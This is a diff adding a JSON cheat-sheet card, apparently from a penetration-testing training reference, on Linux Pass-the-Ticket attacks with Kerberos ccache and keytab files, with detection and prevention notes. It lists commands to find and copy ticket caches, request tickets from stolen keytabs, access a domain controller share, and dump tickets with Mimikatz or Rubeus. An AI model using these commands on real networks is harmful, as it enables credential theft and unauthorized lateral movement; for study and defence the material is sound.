@@ -1,0 +1,132 @@
+{
+  "id": "ptt-linux",
+  "name": "Linux - Pass the Ticket (ccache / keytab)",
+  "command": "export KRB5CCNAME=<ccache_file>",
+  "description": "On domain-joined Linux, reuse Kerberos credentials from ccache files (usually /tmp/krb5cc_*) or keytab files. Point KRB5CCNAME at a ccache to use it, or run kinit -k -t against a keytab to obtain a TGT, then authenticate with -k.",
+  "platform": "linux",
+  "requires": [
+    "ticket"
+  ],
+  "protocols": [
+    "tcp"
+  ],
+  "tools": [
+    "kinit",
+    "klist",
+    "smbclient",
+    "impacket-ticketConverter",
+    "keytabextract"
+  ],
+  "tags": [
+    "kerberos",
+    "pass-the-ticket",
+    "ccache",
+    "keytab",
+    "linux"
+  ],
+  "category": "Lateral Movement",
+  "subcategory": "Pass the Ticket",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 10: Password Attacks",
+  "examples": [
+    {
+      "label": "List principals in a keytab",
+      "command": "klist -k -t /opt/specialfiles/carlos.keytab"
+    },
+    {
+      "label": "Request a TGT from the keytab",
+      "command": "kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab"
+    },
+    {
+      "label": "Point Kerberos at the ccache",
+      "command": "export KRB5CCNAME=/root/krb5cc_647401106_I8I133"
+    },
+    {
+      "label": "Use the ticket with smbclient",
+      "command": "smbclient //dc01/C$ -k -c ls -no-pass"
+    },
+    {
+      "label": "Convert ccache <-> kirbi",
+      "command": "impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi"
+    }
+  ],
+  "notes": "Find tickets: find / -name *keytab* 2>/dev/null and ls -la /tmp. Extract hashes from a keytab with keytabextract.py. Convert ccache<->kirbi with impacket-ticketConverter to reuse tickets on Windows.\nAlso covered in: OSCP PEN-200 Chapter 19 (Password Attacks)",
+  "references": [
+    {
+      "title": "HTB Academy - Password Attacks",
+      "url": "https://academy.hackthebox.com/module/details/147"
+    },
+    {
+      "title": "KeyTabExtract",
+      "url": "https://github.com/sosdave/KeyTabExtract"
+    },
+    {
+      "title": "ccache",
+      "url": "https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html"
+    },
+    {
+      "title": "OffSec PEN-200",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "rubeus-ptt",
+      "rel": "prereq",
+      "note": "Dump tickets with Rubeus on Windows (convert base64 with impacket-ticketConverter) before importing on Linux."
+    },
+    {
+      "id": "mimikatz-ptt",
+      "rel": "alternative",
+      "note": "Windows PtT via Mimikatz kerberos::ptt \u2014 same attack, Windows side."
+    },
+    {
+      "id": "pth-impacket",
+      "rel": "next",
+      "note": "If tickets are unavailable, fall back to Pass the Hash with impacket using the NT hash."
+    }
+  ],
+  "variations": [
+    {
+      "label": "Use ccache",
+      "command": "cp /tmp/krb5cc_* .\nexport KRB5CCNAME=$PWD/krb5cc_*\nklist"
+    },
+    {
+      "label": "kinit from keytab",
+      "command": "kinit <user>@<REALM> -k -t <file.keytab>"
+    },
+    {
+      "label": "SMB with Kerberos",
+      "command": "smbclient //dc01/<share> -k -c ls -no-pass"
+    },
+    {
+      "label": "Convert ccache to kirbi",
+      "command": "impacket-ticketConverter <ccache> <output.kirbi>"
+    }
+  ],
+  "opsec": "loud",
+  "mitre": [
+    "T1550.003"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "On Linux, a Kerberos ccache (KRB5CCNAME) is set so tools (impacket -k, etc.) authenticate with a stolen/forged ticket.",
+    "prerequisites": "A valid/forged ccache/.kirbi and a Linux attacker host.",
+    "impact": "Authenticated access to AD services as the ticket's principal from Linux.",
+    "detection": "[MITRE T1550.003] Anomalous Kerberos activity: a TGS used without a preceding TGT the DC issued; tickets with unusual lifetimes/encryption (RC4 where AES is standard); 4768/4769 anomalies; a ticket used from an unexpected host.",
+    "artifacts": "A ccache file referenced by KRB5CCNAME; Kerberos auth to services from the Linux host.",
+    "prevention": "[MITRE T1550.003 M1026] limit privileged ticket exposure and reset krbtgt (twice) after compromise; enforce AES; monitor for forged/anomalous tickets; Protected Users group for sensitive accounts.",
+    "evasion": "Passing a legitimately-stolen ticket produces no auth failures and reuses valid Kerberos - realistic ticket lifetimes/AES make it blend with normal traffic.",
+    "sources": [
+      "HTB M10",
+      "MITRE T1550.003"
+    ],
+    "misconfiguration": "Pass-the-Certificate (PtC) attacks exploit ADCS certificate abuse (ESC1/ESC8) combined with Kerberos PKINIT. Shadow credentials (pywhisker) exploit write access to msDS-KeyCredentialLink to add a certificate-based authentication mechanism to any account. Pass-the-Ticket works because Kerberos tickets are extractable from LSASS memory.",
+    "vulnerable_config": "# msDS-KeyCredentialLink writable by attacker (GenericWrite on target account):\n# pywhisker.py -t targetuser -a add\n# Adds a fake device credential -> obtain certificate for targetuser\n# -> PKINIT TGT as targetuser -> NTLM hash via UnPAC\n\n# LSASS memory contains TGTs for all logged-in users:\n# Mimikatz: sekurlsa::tickets /export\n# Rubeus: dump /all",
+    "secure_config": "# Prevent msDS-KeyCredentialLink abuse:\n# Audit who has GenericWrite on privileged accounts\n# Only SYSTEM/DCs should write msDS-KeyCredentialLink\nGet-ObjectAcl -Identity admin -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match 'Write'}\n\n# Prevent ticket extraction:\n# Enable Credential Guard (blocks LSASS memory reads)\n# Protected Users group members: tickets not cached in LSASS\n\n# ADCS: prevent ESC1/ESC8 (see those cards)\n# Monitor: Event 4768 with certificate auth, Event 4769 unusual ticket lifetimes"
+  }
+}
